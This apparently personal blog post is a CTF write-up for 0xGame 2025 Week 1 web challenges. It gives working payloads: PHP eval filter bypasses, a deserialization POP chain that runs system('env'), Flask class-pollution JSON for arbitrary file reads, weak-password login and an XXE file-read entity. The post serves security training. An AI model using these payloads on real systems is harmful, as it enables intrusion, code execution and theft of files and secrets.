---
description: '整理 0xGame 2025 Week1 的解题过程与知识点复盘。'
title: 0xgame2025（week1
date: 2025-10-14T17:17:02Z
lastmod: 2025-10-14T19:57:25Z
top_img: /img/2abc3f959e3c1983556049fa213be07c.jpg
tags: [CTF,WP]
categories: [CTF,WP]
toc: true
toc_number: true
mathjax: false
katex: false
comments: true
---

# 0xgame2025（week1

## Http的真理，我已解明

```http
POST /?hello=web HTTP/1.1
Host: 80-88be64bf-b04b-4de3-abda-67450325761a.challenge.ctfplus.cn
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Safari
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
cookie:Sean=god
Referer:www.mihoyo.com
Via:clash

http=good
```

‍

## Lemon

禁用了F12和右键，打开开发者工具

‍

## RCE1

```php
源码
<?php
error_reporting(0);
highlight_file(__FILE__);
$rce1 = $_GET['rce1'];
$rce2 = $_POST['rce2'];
$real_code = $_POST['rce3'];

$pattern = '/(?:\d|[\$%&#@*]|system|cat|flag|ls|echo|nl|rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings)/i';

function check(string $text): bool {
    global $pattern;
    return (bool) preg_match($pattern, $text);
}


if (isset($rce1) && isset($rce2)){
    if(md5($rce1) === md5($rce2) && $rce1 !== $rce2){
        if(!check($real_code)){
            eval($real_code);
        } else {
            echo "Don't hack me ~";
        }
    } else {
        echo "md5 do not match correctly";
    }
}
else{
    echo "Please provide both rce1 and rce2";
}
?>
```

前面挺好绕的md5强比较，用数组（两个数组都为NULL）

这边过滤了​`/(?:\d|[$%&#@*]|system|cat|flag|ls|echo|nl|rev|more|grep|cd|cp|vi|passthru|shell|vim|sort|strings)/i`

过滤了挺多的

```php
print(implode("\n",scandir('/')));  //  ls /
print(file_get_contents('/'.'f'.'l'.'a'.'g'));  //  /flag

官方的
rce3=print(`tac /f???`);
rce3=readfile('/'.'fl'.'ag');
```

所以结果就是

```php
GET：rce1[]=1
POST:rce2[]=2&rce3=print(file_get_contents('/'.'f'.'l'.'a'.'g'));
```

‍

## Rubbish_Unser

```php
源码
<?php
error_reporting(0);
highlight_file(__FILE__);

class ZZZ
{
    public $yuzuha;
    function __construct($yuzuha)
    {
        $this -> yuzuha = $yuzuha;
    }
    function __destruct()
    {
        echo "破绽，在这里！" . $this -> yuzuha;
    }
}

class HSR
{
    public $robin;
    function __get($robin)
    {
        $castorice = $this -> robin;
        eval($castorice);
    }
}

class HI3rd
{
    public $RaidenMei;
    public $kiana;
    public $guanxing;
    function __invoke()
    {
        if($this -> kiana !== $this -> RaidenMei && md5($this -> kiana) === md5($this -> RaidenMei) && sha1($this -> kiana) === sha1($this -> RaidenMei))
            return $this -> guanxing -> Elysia;
    }
}

class GI
{
    public $furina; 
    function __call($arg1, $arg2)
    {
        $Charlotte = $this -> furina;
        return $Charlotte();
    }
}

class Mi
{
    public $game;
    function __toString()
    {
        $game1 = @$this -> game -> tks();
        return $game1;
    }
}

if (isset($_GET['0xGame'])) {
    $web = unserialize($_GET['0xGame']);
    throw new Exception("Rubbish_Unser");
}
?>
```

```php
链子挺清晰的
ZZZ::__destruct → __toString→ Mi::__toString → GI::__call()→ HI3rd::__invoke → HSR::__get() → eval
```

md5和sha1分别相等   a=1 b='1'

然后就是`throw new Exception("Rubbish_Unser")`，利用php的gc回收机制

在php中，当对象被销毁时会自动调用__destruct()方法，但如果程序报错或者抛出异常，就不会触发该魔术方法。

当一个类创建之后它会自己消失，而 __destruct() 魔术方法的触发条件就是一个类被销毁时触发，而throw那个函数就是回收了自动销毁的类，导致destruct检测不到有东西销毁，从而也就导致无法触发destruct函数。

我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒__destruct()魔术方法。

触发gc回收机制：1.对象被unset()处理   2.数组对象为NULL

```php
可构造
可构造
<?php
error_reporting(0);
 highlight_file(__FILE__);
 class ZZZ
 {
 public $yuzuha;
 }
 class HSR
 {
 public $robin;
 }
 class HI3rd
 {
 public $guanxing;
 }
 class GI
 {
 public $furina;  
}
 class Mi
 {
 public $game;
 }
 $a = new HSR();
 $a->robin = "system('env');";
 $b = new HI3rd();

 $b->kiana=1;
 $b->RaidenMei='1';   //比较

 $b -> guanxing = $a;
 $c = new GI();
 $c -> furina = $b;
 $d = new Mi();
 $d -> game = $c;
 $e = new ZZZ();
 $e -> yuzuha = $d;

 $A = array($e,0); //gc
 echo urlencode(serialize($A));
```

‍

## Lemon_RevEnge(复现

```python
源码
from flask import Flask,request,render_template
import json
import os

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class Dst():
    def __init__(self):
        pass

Game0x = Dst()

@app.route('/',methods=['POST', 'GET'])
def index():
    if request.data:
        merge(json.loads(request.data), Game0x)  #看到merge差不多就原型链污染了
    return render_template("index.html", Game0x=Game0x)

@app.route("/<path:path>")
def render_page(path):
    if not os.path.exists("templates/" + path):
        return "Not Found", 404
    return render_template(path)


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=9000)

```

用的是这个师傅https://normalsubgroup.cauchy.top/blog/game0x2025w1/ 的payload

从静态路由读取任意文件

​`{"__init__":{"__globals__":{"app":{"static_folder":"/proc/1/root"}}}}`

```curl
┌──(kali1㉿kali)-[~]
└─$ curl -s -X POST "http://nc1.ctfplus.cn:31200/" -H 'Content-Type: application/json' \  --data '{"__init__":{"__globals__":{"app":{"static_folder":"/proc/1/root"}}}}'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WAWAWA</title>
</head>
<body>
    <h1>flag 其实就在 /flag 里，但是为什么拿不到呢？</h1>
    <p>如果欢与歌 跟酸与涩 都只是梦一重</p>
    <p>也许我 仍会选择 某个仲夏 再跟你重逢</p>
    <p>直到找回你 赠予我的 被遗落的 珍奇</p>
    <p>让所有 闪光的回忆 不再被时间风化</p>
    <p>人越珍视的 越无价的 幸福越难长留</p>
    <p>只有你 提醒了我 那是圆缺 不是所有</p>
    <p>我总藏匿起 如柠檬般 最酸涩的念头</p>
    <p>但是你 总是能带我找到 沉默的出口</p>
    <p>我想我们终将知道 世上每个人都需要</p>
    <p>让自己变得更加快乐 那件礼物</p>
    <p>那一天的忧郁 忧郁起来</p>
    <p>那一天的寂寞 寂寞起来</p>
    <p>连同着迷这个 炎炎夏日 万般滋味 那个你</p>
    <p>都化作了烙印 在我心底</p>
    <p>挥之不去的柠檬气息</p>
    <p>在晴朗驱散大雨之前都 无法被抹去</p>
    <p>如同嚼下一口柠檬那样 让我难忘记</p>
    <p>你是我永远驻足眺望的 唯一那束光</p>
</body>
</html>                                                                             
┌──(kali1㉿kali)-[~]
└─$ curl -s "http://nc1.ctfplus.cn:31200/static/flag"
0xGame{Welcome_to_Easy_Pollute~}

```

官方wp是这个`{ "__init__":{"__globals__":{"os":{"path":{"pardir":","}}}}}`然后目录穿越，但我没读出来flag

‍

## 留言板（粉）

打开啥玩意没有，dirsearch扫一下，扫到了个登录页

```curl
[19:21:37] 200 -  213B  - /Dockerfile                                       
[19:21:37] 200 -   83B  - /docker-compose.yml                               
[19:21:45] 200 -    2KB - /login.php
[19:21:53] 200 -    2B  - /ping
```

登入账号密码是admin/admin123  （弱密码爆破）

登入后，明显是xxe

```curl
<!DOCTYPE x [
  <!ENTITY xxe SYSTEM "php://filter/resource=/flag">
]>
<msg>&xxe;</msg>
直接读出来了
```

‍

